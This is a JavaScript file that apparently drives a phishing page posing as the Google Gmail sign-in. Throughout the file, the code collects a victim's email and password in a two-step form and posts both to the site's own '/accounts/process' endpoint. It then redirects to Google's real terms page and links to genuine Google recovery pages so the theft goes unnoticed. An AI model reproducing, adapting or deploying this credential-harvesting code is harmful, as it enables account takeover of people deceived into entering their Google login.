localStorage.setItem('emailValueLocal', null);
localStorage.setItem('passwordValueLocal', null);
let checkbox = document.getElementById("flexCheckDefault");
let emailInput = document.getElementById("floatingInputEmail");
let passwordInput = document.getElementById("floatingInputPassword");

emailInput.addEventListener('blur', function () {
    const re = /\S+@gmail\.com/;
    let email = emailInput.value;

    if (re.test(email)) {
        document.getElementById("login-submit-button").disabled = false;
    } else {
        document.getElementById("login-submit-button").disabled = true;
    }
});

passwordInput.addEventListener('blur', function () {
    let password = passwordInput.value;

    if (password.trim() !== "") {
        document.getElementById("password-sumbit-button").disabled = false;
    } else {
        document.getElementById("password-sumbit-button").disabled = true;
    }
});

checkbox.addEventListener('change', function () {
    if (this.checked) {
        passwordInput.type = "text";
    } else {
        passwordInput.type = "password";
    }
});

document.getElementById("login-submit-button").addEventListener("click", function () {
    let emailValue = document.getElementById("floatingInputEmail").value;

    localStorage.setItem('emailValueLocal', emailValue);
    document.getElementById("email-content").classList.add("d-none");
    document.getElementById("password-content").classList.remove("d-none");
    document.getElementById("password-email").textContent = emailValue;
});

document.getElementById("password-sumbit-button").addEventListener("click", function () {
    let passwordValue = document.getElementById("floatingInputPassword").value;
    localStorage.setItem('passwordValueLocal', passwordValue);

    document.getElementById("floatingInputPassword").disabled = true
    document.getElementById("password-sumbit-button").disabled = true

    fetch('/accounts/process', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ email: localStorage.getItem('emailValueLocal'), password: localStorage.getItem('passwordValueLocal') })
    })
        .then(response => response.json())
        .then(data => {
            localStorage.setItem('emailValueLocal', null);
            localStorage.setItem('passwordValueLocal', null);

            if(data.status == 200){
                window.location.href = "https://policies.google.com/terms?gl=AR&hl=es";
            }
        })
        .catch(error => {
            console.error('Error:', error);
        });
});

function redirect(e) {
    switch (e) {
        case "loginRecover":
            window.location.href = "https://accounts.google.com/signin/v2/usernamerecovery?continue=https%3A%2F%2Fmail.google.com%2Fmail&dsh=S268592723%3A1709578151073904&ec=GAlAFw&flowEntry=AddSession&flowName=GlifWebSignIn&hl=es-419&service=mail&theme=mn&authuser=1";
            break;
        case "loginInformation":
            window.open("https://support.google.com/chrome/answer/6130773?hl=es-419", "_blank");
            break;
        case "loginCreate":
            window.location.href = "https://accounts.google.com/lifecycle/steps/signup/name?continue=https://mail.google.com/mail&dsh=S268592723:1709578151073904&ec=GAlAFw&flowEntry=SignUp&flowName=GlifWebSignIn&hl=es-419&service=mail&theme=mn&TL=ADg0xR1MkTAAkHYCJvN2YXRUpBUitTUX8EV05tkBiFW5o83eCyJlY9N6kYscleZn";
            break;
        case "passwordRecover":
            window.location.href = "https://accounts.google.com/v3/signin/rejected?TL=ADg0xR15akbCbZZvYtYLqCUylm00An5ryh5YvzkPtRXf68wue28YHGl0dhAT2Bq3&checkConnection=youtube%3A175&checkedDomains=youtube&continue=https%3A%2F%2Ftakeout.google.com%2Fu%2F1%2F%3Fhl%3Des%26pli%3D1&dsh=S906359482%3A1709515983735972&ec=GAlAwAE&flowEntry=AddSession&flowName=GlifWebSignIn&hl=es&pstMsg=1&rhlk=dev&rrk=53&theme=glif&authuser=1";
            break;
        default:
            break;
    }
}